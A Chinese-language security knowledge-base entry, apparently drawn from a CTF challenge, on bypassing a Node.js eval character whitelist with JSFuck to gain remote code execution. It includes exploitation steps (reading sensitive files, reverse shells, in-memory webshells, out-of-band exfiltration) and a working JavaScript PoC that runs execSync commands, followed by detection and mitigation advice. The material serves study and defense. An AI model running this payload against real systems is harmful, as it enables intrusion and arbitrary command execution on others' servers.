---
id: web-nodejs-eval-jsfuck-char-whitelist-rce
title: Node.js eval 接入字符白名单：允许 JSFuck 字符集即等于任意代码执行
type: scenario
domain: web
path: web/nodejs
technique: node-eval-jsfuck-char-whitelist-bypass
tags:
- nodejs
- express
- eval
- waf-bypass
- jsfuck
- character-whitelist
- rce
- process-mainmodule
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V108
  verified_at: '2026-11-05T22:36:04+08:00'
  notes: 对照签到223：Express 4.18、POST /calc、ALLOW_CHARS、eval、JSFuck 编码与 return 回显一致；未复跑
url: /docs/web/nodejs/web-nodejs-eval-jsfuck-char-whitelist-rce/
draft: false
kb_aliases:
- Node.js 计算器 eval RCE
- JSFuck WAF 绕过
- 字符白名单 JSFuck
- ALLOW_CHARS 绕过后任意命令执行
- eval(operator) 命令注入
- 方括号字符发生器
---

## 一句话结论

当 Node.js 接口把用户输入直接 `eval`，并用“只允许数字、运算符和括号”的正则做防护时，只要白名单放行了 `[`、`]`、`!`、`+`、`(`、`)`，攻击者就可以用 JSFuck 编码把任意 JavaScript 程序（包括 `require('child_process').execSync()`）送进 `eval`，字符白名单形同虚设。

## 原理

- 题目接口 `POST /calc` 的请求体 `{"expr": "..."}` 被后端 `calc(operator)` 直接 `return eval(operator)` 执行；`eval` 在本作用域内拥有完整的 Node.js 能力，包括 `process`。
- 防护是一个字符白名单：`ALLOW_CHARS=/^[012345679!.-+*/()[]]+$/`。它没有字母、引号、下划线、分号，甚至刻意去掉了数字 `8`，表面上看无法写出标识符和字符串。
- 但 JSFuck 的字符集恰好是 `[]()!+` 六个字符，完全是该白名单的子集。JSFuck 的原理是用数组字面量与类型强制转换生成字符：
  - `[]+[]` 得到空串 `""`；
  - `[]+![]` 得到 `"false"`；
  - `![]+[]`、`[][[]]` 等组合可取出 `"undefined"`、`"NaN"`、`"Infinity"` 中的单个字母；
  - `"".constructor` 是 `String` 构造器，`[]["filter"]["constructor"]` 可回到 `Function` 构造器，再用 `Function("return process")()` 拿回全局对象；
  - 因而 `[]()!+` 足以构造任意字符串和任意函数体，进而恢复完整的 JS 执行能力。
- 白名单作者堵死了字母、引号、下划线、分号，却保留了 `[` 和 `]`；方括号是 JSFuck 字符发生器的根，放行方括号等于放行整个字符表。
- `eval` 的返回值经 `res.json` 回显。若只提交一个纯表达式，`eval` 的结果是表达式值；JSFuck 的 `encode(program, true)` 会把载荷包成函数体，因此程序体必须显式 `return` 结果，否则返回 `undefined`，响应里看不到命令输出。

## 触发条件

- Node.js 服务端存在 `eval`/`new Function`/`vm.runInThisContext` 等动态执行，且输入可控。
- 防护为字符白名单或字符黑名单，白名单包含 `[`、`]` 且至少包含 `!`、`+`、`(`、`)`；或者黑名单没有拦截方括号/叹号/加号组合。
- 输入长度上限足够容纳 JSFuck 膨胀后的载荷（常见几 KB 到几十 KB）。
- 回显通道存在（响应体、日志、盲注时间差均可），否则只能盲打。

## 利用步骤

1. 确认接口把输入送进 `eval`，并用探测串（如 `1+1`）确认返回值回显。
2. 构造程序体，用 `return` 把命令输出带回：`return process.mainModule.require('child_process').execSync('id').toString()`。
3. 用 JSFuck 编码器（如 npm `jsfuck` 的 `JSFuck.encode(program, true)`）把程序体编码成只含 `[]()!+` 的字符串。
4. POST 到接口，确认命令输出；随后读取容器内 flag/敏感文件、执行反弹 shell 或写入内存马。
5. 若命令含引号或特殊字符，用 `JSON.stringify` 生成字符串字面量后再交给 JSFuck 编码；长度不足时分段执行或把结果写到临时文件再读取。

## PoC

```javascript
// 攻击端：jsfuck 编码并发送
const { JSFuck } = require('jsfuck');
const URL = process.argv[2] || 'http://target/calc';
const CMD = process.argv[3] || 'cat /flag';
const program =
  "return process.mainModule.require('child_process').execSync(" +
  JSON.stringify(CMD) + ").toString()";
const code = JSFuck.encode(program, true);

const resp = await fetch(URL, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ expr: code }),
});
console.log((await resp.json()).result);
```

```text
# 编码后的载荷只包含 []()!+ 等白名单字符，例如：
[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+...][...](...)
```

## 变体与关联

- 变体：`new Function(input)()`、`vm.runInNewContext`、模板引擎的 `Function` 编译入口同理；只要执行上下文能触及 `process`，JSFuck 就能恢复 `require`。
- 变体：若白名单不允许方括号，仍可用 `constructor` 链、`unescape`/`atob`、`String.fromCharCode` 等构造字符，但需要字母或引号，难度取决于放行字符集。
- 变体：不回显时可把结果写文件、发 DNS/HTTP 外带，或用 `execSync` 的耗时做时间盲注。
- 关联：[[web-nodejs-prototype-pollution-undeclared-identifier-function-rce]]（同为 Node 动态执行面）、[[web-java-expression-spel-injection-to-rce]]（表达式注入的通用思路）。
- 边界：JSFuck 载荷体积大，受请求体大小和 WAF 长度限制；Node 版本过新时 `process.mainModule` 可能为 `undefined`，可改用 `process.binding`、`global.process` 或 `require` 的其他取得方式。

## 检测与防御

- 检测：审计所有 `eval`/`Function`/`vm` 调用；对请求体中出现大量 `[]()!+` 组合、连续方括号、超长无字母表达式告警；关注 `/calc` 等计算器接口返回意外命令输出。
- 修复：移除 `eval`，改用白名单解析器（如只接受数字和四则运算符并自行求值）；确需动态求值时使用隔离的表达式引擎并禁用 `process`/`require`。
- 加固：字符白名单应拒绝 `[`、`]`、`!` 等非必要字符，并限制长度；进程降权、容器只读、禁用不必要的系统命令；不要把“字符白名单”当作代码执行沙箱。
